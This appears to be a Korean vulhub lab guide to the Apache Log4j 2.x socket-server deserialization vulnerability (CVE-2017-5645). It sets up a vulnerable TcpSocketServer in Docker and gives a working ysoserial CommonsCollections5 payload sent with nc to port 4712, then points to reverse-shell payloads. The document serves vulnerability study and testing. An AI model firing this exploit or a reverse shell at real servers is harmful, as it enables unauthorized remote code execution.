# Apache Log4j 서버 역직렬화 명령 실행 취약점(CVE-2017-5645)
Apache Log4j는 원격 로그 서버 시작을 지원하는 Java용 로깅 라이브러리입니다. 2.8.2 이전의 Apache Log4j 2.x 버전에는 보안 취약점이 있습니다. 공격자는 이 취약점을 악용하여 임의 코드를 실행할 수 있습니다.

## 설명
log4j 소켓 서버에서 원격 로깅을 사용할 때 log4j 서버는 TCP 또는 UDP를 통해 수신된 모든 로그 이벤트를 역직렬화하는 것으로 나타났습니다. 공격자는 이 결함을 이용하여 역직렬화 중에 로거 응용 프로그램의 컨텍스트에서 임의 코드를 실행하는 특수하게 조작된 로그 이벤트를 보낼 수 있습니다.

## 상태
Log4j-1.x의 결함은 이제 CVE-2019-17571로 식별됩니다. CVE-2017-5645는 MITRE에 의해 Log4j-2.x에서 식별된 유사한 결함에 할당되었습니다.

## 취약점 환경

취약성 환경을 시작하려면 다음 명령을 실행하십시오.

```
docker compose up -d
```

환경이 시작되면 포트 4712에서 TCPServer가 열립니다.   

그런데 vulhub의 docker 이미지를 사용하여 환경을 구축하는 것 외에도 log4j jar 파일을 다운로드한 후 명령줄에서 직접 TCPServer를 시작할 수 있습니다: `java -cp "log4j-api-2.8.1.jar:log4j- core-2.8 .1.jar:jcommander-1.72.jar" org.apache.logging.log4j.core.net.server.TcpSocketServer`

## 취약점 재발

ysoserial을 사용하여 페이로드를 생성한 다음 `your-ip:4712` 포트로 직접 보냅니다.   

```
java -jar ysoserial-master-v0.0.5-gb617b7b-16.jar CommonsCollections5 "touch /tmp/success" | nc your-ip 4712
```

그런 다음 `docker compose exec log4j bash`를 실행하여 컨테이너에 들어가면 /tmp/success가 성공적으로 생성된 것을 볼 수 있습니다.   


[리바운드 셸 명령](http://www.jackson-t.ca/runtime-exec-payloads.html)을 실행하고 성공적으로 셸로 되돌아옵니다.
